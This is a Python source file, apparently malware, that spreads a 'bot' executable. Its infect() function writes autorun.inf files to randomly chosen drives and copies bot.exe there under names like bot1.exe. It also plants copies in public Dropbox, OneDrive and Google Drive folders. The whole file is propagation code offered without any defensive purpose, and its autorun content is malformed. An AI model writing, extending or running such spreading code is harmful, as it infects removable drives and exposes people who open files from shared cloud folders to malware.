import os
import shutil
import random
import platform

# Define lists for file and drive names
spread_names = ["bot1", "bot2", "bot3"]
drive_names = ["C:", "D:", "E:"]

def check_file_exist(file_path):
    """Check if a file exists at the given path."""
    return os.path.exists(file_path)

def copy_file_to_directory(src, dest):
    """Copy a file from src to dest directory."""
    try:
        shutil.copy2(src, dest)
        print(f"Copied {src} to {dest}")
    except Exception as e:
        print(f"Failed to copy {src} to {dest}: {e}")

def create_file_and_write_data(file_path, data):
    """Create a file and write data to it."""
    try:
        with open(file_path, 'w') as file:
            file.write(data)
        print(f"Created {file_path} and wrote data")
    except Exception as e:
        print(f"Failed to create {file_path}: {e}")

def infect(infection_type):
    """Perform different actions based on the infection type."""
    bot_source = "path/to/source/bot.exe"  # Path to the source bot

    def infect_drive():
        """Create an AutoRun file in a randomly selected drive."""
        drive = random.choice(drive_names)
        bot_name = random.choice(spread_names) + ".exe"
        autorun_content = f'cd /d "{drive}\\"{bot_name}'
        autorun_path = f'{drive}\\autorun.inf'
        
        if not check_file_exist(autorun_path):
            create_file_and_write_data(autorun_path, autorun_content)

        shutil.copy2(bot_source, f'{drive}\\{bot_name}')

    def infect_dropbox():
        """Copy the bot to the public Dropbox folder."""
        public_dropbox = os.path.expanduser("~\\Dropbox (Public)")
        dest_path = os.path.join(public_dropbox, random.choice(spread_names) + ".exe")
        
        if not check_file_exist(dest_path):
            copy_file_to_directory(bot_source, dest_path)

    def infect_onedrive():
        """Copy the bot to the public OneDrive folder."""
        public_onedrive = os.path.join(os.path.expanduser("~"), "OneDrive", "Public")
        dest_path = os.path.join(public_onedrive, random.choice(spread_names) + ".exe")
        
        if not check_file_exist(dest_path):
            copy_file_to_directory(bot_source, dest_path)

    def infect_googledrive():
        """Copy the bot to the public Google Drive folder."""
        public_googledrive = os.path.join(os.path.expanduser("~"), "Google Drive", "My Drive", "Public")
        dest_path = os.path.join(public_googledrive, random.choice(spread_names) + ".exe")
        
        if not check_file_exist(dest_path):
            copy_file_to_directory(bot_source, dest_path)

    if infection_type == "drive":
        infect_drive()
    elif infection_type == "dropbox":
        infect_dropbox()
    elif infection_type == "onedrive":
        infect_onedrive()
    elif infection_type == "googledrive":
        infect_googledrive()
    elif infection_type == "all":
        infect_drive()
        infect_dropbox()
        infect_onedrive()
        infect_googledrive()
    else:
        print(f"Unknown infection type: {infection_type}")

# Example usage:
# infect("all")